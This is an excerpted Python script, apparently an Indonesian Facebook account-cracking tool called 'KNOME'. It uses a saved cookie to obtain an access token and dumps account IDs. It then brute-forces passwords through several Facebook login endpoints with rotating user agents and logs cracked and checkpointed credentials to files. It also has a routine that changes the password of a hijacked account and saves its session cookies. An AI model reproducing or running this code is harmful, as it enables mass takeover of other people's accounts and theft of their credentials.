...
console = Console()
sys.stdout.write('\x1b]2; KNOME | @i8q_8 Tele\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
...
def uaku():
	try:
		ua=open('-@i8q_8.Knome.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/-@i8q_8.Knome.txt').text
		ua=open('.-@i8q_8.Knome.txt','w')
...
okc = 'KNOME-OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'KNOME-CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
...
def login():
	try:
		token = open('-@i8q_8.Token.txt','r').read()
		cok = open('-@i8q_8.Cok.txt','r').read()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print(f"\n [+] Token : {access_token}")
							tokenew = open("-@i8q_8.Token.txt","w").write(access_token)
							cook= open("-@i8q_8.Cok.txt","w").write(your_cookies)
							print("\n [+] Login Berhasil | python BrayennnFB.py");exit()
			except Exception as e:
				print(" [+] Cookies Mokad Kontol")
				os.system('rm -rf -@i8q_8.Token.txt && rm -rf -@i8q_8.Cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
...
def menu(my_name,my_id):
	...
	if _____brayennn___xd____ in ['1','01']:
		...
		os.system('rm -rf -@i8q_8.Token.txt')
...
def crack_file():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('Tele-@i8q_8/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('Tele-@i8q_8/'+geh,'r').read().splitlines()
		except:
...
def result():
	...
	if kz in ['2','02']:
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('KNOME-CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				exit()
			try:lin = open('KNOME-CP/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				back()
		...
		try:vin = os.listdir('KNOME-OK')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' [+] Anda Tidak Mempunyai File KNOME-OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('KNOME-OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('KNOME-OK/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				back()
...
def brayen_dump():
	try:
		token = open('-@i8q_8.Token.txt','r').read()
		kukis = open('-@i8q_8.Cok.txt','r').read()
	except IOError:
		exit()
...
def passwrd():
	...
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]KNOME-OK SAVE IN",style=f"bold white"))
	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]KNOME-CP SAVE IN",style=f"bold white"))
	...
	print(f'  [{h}•{x}]{h} KNOME-OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} KNOME-CP : {k}%s{x} '%(cp))
...
def validate1(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} KNOME-OK-:[bold green]{ok}[/] KNOME-CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(tree)
				open('KNOME-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				cetak(tree) 
				open('KNOME-OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
...
def validate2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mbasic{x} {loop}/{len(id)} KNOME-OK-:[bold green]{ok}[/] KNOME-CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def validate3(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Free{x} {loop}/{len(id)} KNOME-OK-:[bold green]{ok}[/] KNOME-CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def kontol(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Async{x} {loop}/{len(id)} KNOME-OK-:[bold green]{ok}[/] KNOME-CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def bapi(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}B-Api{x} {loop}/{len(id)} KNOME-OK-:[bold green]{ok}[/] KNOME-CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def opsi():
	...
	if romi == "":
		...
		back()
	try:
		file_cp = open(KNOME-CP+romi, "r").readlines()
	except IOError:
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			...
			open('KNOME-OK/KNOME-OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
		...
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					...
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						...
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] KNOME-OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('KNOME-OK/KNOME-OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
			...
			if "c_user" in session.cookies.get_dict():
				...
				open('KNOME-OK/KNOME-OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
...
if __name__=='__main__':
	...
	try:os.mkdir('KNOME-OK')
	except:pass
	try:os.mkdir('KNOME-CP')
	except:pass
	try:os.mkdir('Tele-@i8q_8')
	except:pass
	try:os.system('touch -@i8q_8.Prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
